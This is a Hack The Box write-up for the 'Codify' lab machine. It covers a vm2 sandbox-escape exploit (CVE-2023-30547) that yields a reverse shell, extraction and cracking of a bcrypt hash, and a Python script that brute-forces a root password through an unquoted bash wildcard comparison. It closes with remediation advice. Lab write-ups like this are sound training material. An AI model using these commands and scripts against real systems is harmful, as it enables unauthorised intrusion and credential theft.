# Hack The Box — Codify Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Platform](https://img.shields.io/badge/Platform-HackTheBox-green)

Full penetration testing walkthrough and writeup for **Codify** machine on Hack The Box.

---

## 📌 Machine Info

| Field | Value |
| :--- | :--- |
| **Name** | Codify |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Key Concepts** | vm2 RCE (CVE-2023-30547), SQLite DB Enum, Bcrypt Cracking, Bash Wildcard Pattern Matching Abuse |

---

## 🛠️ Summary / Attack Chain


[Nmap Scan: Ports 22, 80, 3000] ➡️ [Node.js Sandbox App (vm2) Detected]
                                      ⬇️
     [CVE-2023-30547: vm2 Sandbox Escape RCE] ➡️ [Reverse Shell as 'svc']
                                      ⬇️
  [SQLite Enum: /var/www/contact/tickets.db] ➡️ [Extract Joshua's Bcrypt Hash]
                                      ⬇️
     [John the Ripper (rockyou.txt)] ➡️ [SSH as 'joshua'] ➡️ [Read user.txt]
                                      ⬇️
   [Sudo Check: /opt/scripts/mysql-backup.sh] ➡️ [Wildcard Comparison Vulnerability]
                                      ⬇️
[Python Bruteforce Script] ➡️ [Extract Root MySQL Password] ➡️ [su root] ➡️ [Read root.txt]


## 🔍 Phase 1: Reconnaissance & Enumeration

### 1. Port Discovery

Fast port scan across all 65,535 TCP ports to discover open services:

Bash

```
nmap -Pn -n -sS -p- --min-rate 5000 --open <TARGET_IP>
```

### 2. Service Version Detection

Detailed enumeration on ports **22, 80, 3000**:

Bash

```
nmap -sVC -p 22,80,3000 <TARGET_IP>
```

## 💥 Phase 2: Initial Access (Foothold)

### 1. Exploiting vm2 Sandbox Escape (CVE-2023-30547)

The web application running on port 3000 utilizes a vulnerable version of the Node.js `vm2` sandbox library.

Clone the public exploit repository:

Bash

```
git clone [https://github.com/user0x1337/CVE-2023-30547](https://github.com/user0x1337/CVE-2023-30547)
cd CVE-2023-30547
```

### 2. Exploit Execution

Start a local Netcat listener on your attacking machine:

Bash

```
ncat -lnvp 4444
```

Execute the exploit targeting the vulnerable web application:

Bash

```
python3 exploit.py --url "http://<TARGET_IP>:3000" --lhost <YOUR_IP> --lport 4444
```

Verify your initial foothold shell:

Bash

```
whoami
```

## 🔎 Phase 3: Internal Enumeration & Lateral Movement

### 1. SQLite Database Enumeration

Navigate to the web directory `/var/www/contact` and inspect the SQLite database:

Bash

```
cd /var/www/contact
ls -la
sqlite3 tickets.db
```

Extract Joshua's bcrypt hash:

SQL

```
SELECT password FROM users WHERE username='joshua';
```

_(Press `CTRL + d` to exit)_

### 2. Cracking the Bcrypt Hash

Crack the extracted hash using John the Ripper and `rockyou.txt`:

Bash

```
echo "<HASH_BCRYPT>" > hash.txt
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### 3. SSH Access & User Flag

Authenticate via SSH using Joshua's cracked credentials:

Bash

```
ssh joshua@<TARGET_IP>
cat user.txt
```

## ⚡ Phase 4: Privilege Escalation

### 1. Sudo Rights Enumeration

Check allowed sudo commands for user `joshua`:

Bash

```
sudo -l
```

**Output:** `(ALL : ALL) NOPASSWD: /opt/scripts/mysql-backup.sh`

### 2. Analyzing the Backup Script

Inspect `/opt/scripts/mysql-backup.sh`:

Bash

```
cat /opt/scripts/mysql-backup.sh
```

**Vulnerability:** The script uses an unquoted pattern match in Bash (`[[ $USER_PASS == $DB_PASS* ]]`). This allows wildcards (`*`) inside user input to perform a character-by-character brute-force attack against the actual password.

### 3. Automated Password Extraction (Python)

Create `bruteforce.py` to extract the root password character-by-character:

Python

```
import string
import subprocess

all_characters = list(string.ascii_letters + string.digits)
password = ""
found = False

while not found:
    for character in all_characters:
        # Test password + character + wildcard (*)
        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
        
        if "Password confirmed!" in output:
            password += character
            print(f"Found: {password}")
            break
    else:
        found = True

print(f"Root Password: {password}")
```

Run the script to extract the password:

Bash

```
python3 bruteforce.py
```

### 4. Root Flag

Switch to the `root` user context using the extracted password:

Bash

```
su root
cat /root/root.txt
```

## 🛡️ Remediation & Mitigations

- **Patch Node.js Libraries:** Deprecate or upgrade vulnerable sandbox libraries such as `vm2` (CVE-2023-30547).
    
- **Secure Bash Scripting:** Always quote variables in string comparison operations (`[[ "$USER_PASS" == "$DB_PASS" ]]`) to prevent unintentional pattern matching and wildcard injection in privileged scripts.
    
